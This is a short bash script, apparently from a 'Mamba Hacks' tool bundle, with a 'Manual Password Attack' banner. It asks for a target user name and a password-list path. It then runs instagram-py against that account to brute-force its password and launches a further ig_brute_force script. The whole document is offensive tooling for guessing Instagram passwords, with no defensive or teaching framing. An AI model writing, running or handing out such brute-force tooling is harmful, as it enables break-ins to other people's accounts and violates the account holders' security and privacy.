#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo '
███╗░░░███╗░█████╗░███╗░░░███╗██████╗░░█████╗░  ██╗░░██╗░█████╗░░█████╗░██╗░░██╗░██████╗
████╗░████║██╔══██╗████╗░████║██╔══██╗██╔══██╗  ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝
██╔████╔██║███████║██╔████╔██║██████╦╝███████║  ███████║███████║██║░░╚═╝█████═╝░╚█████╗░
██║╚██╔╝██║██╔══██║██║╚██╔╝██║██╔══██╗██╔══██║  ██╔══██║██╔══██║██║░░██╗██╔═██╗░░╚═══██╗
██║░╚═╝░██║██║░░██║██║░╚═╝░██║██████╦╝██║░░██║  ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░
              [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By Mamba Hacks << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [[ $inspass = 0 ]]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
cd $HOME/insta-hack
fi
cd $HOME/insta-hack/ig_brute_force
bash ighack.sh
